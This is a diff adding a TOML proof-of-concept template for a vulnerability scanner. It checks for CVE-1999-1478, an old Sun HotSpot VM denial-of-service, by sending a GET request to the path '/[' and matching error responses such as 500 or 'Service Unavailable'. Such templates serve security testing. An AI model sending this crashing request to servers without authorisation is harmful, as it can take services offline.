@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "通过发送包含 '[' 字符的特制 HTTP 请求，触发 Sun HotSpot Performance Engine VM 崩溃，导致运行 HotSpot 的 Web 服务器拒绝服务。验证方式为发送恶意请求后检查服务器是否返回 500 或 Service Unavailable 等异常响应。"
+id = "POC-AVE-1999-1127"
+name = "Sun HotSpot Performance Engine VM DoS PoC"
+severity = "medium"
+tags = [
+    "cve-1999-1478",
+    "dos",
+    "hotspot",
+]
+vuln_id = [
+    "CVE-1999-1478",
+    "AVE-1999-1127",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/["
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "Service Unavailable",
+    "Internal Server Error",
+]
